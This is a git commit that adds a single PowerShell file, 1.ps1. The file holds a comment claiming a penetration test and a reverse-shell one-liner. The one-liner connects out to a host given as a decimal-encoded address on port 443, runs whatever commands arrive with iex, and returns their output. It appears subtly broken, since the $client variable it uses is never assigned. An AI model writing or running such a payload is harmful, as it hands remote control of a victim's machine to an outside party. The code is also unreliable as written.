9c34f95598852beab196f3517e2d4ea44481aa9b
poc6823 <100234222+poc6823@users.noreply.github.com>
2022-02-22 11:17:02 -0800

    Create 1.ps1

---
+++ 1.ps1
@@ -0,0 +1,3 @@
+#stratum pentest - craig.arendt@stratumsecurity.com. hi to the #avengers
+
+New-Object System.Net.Sockets.TCPClient('601150311',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
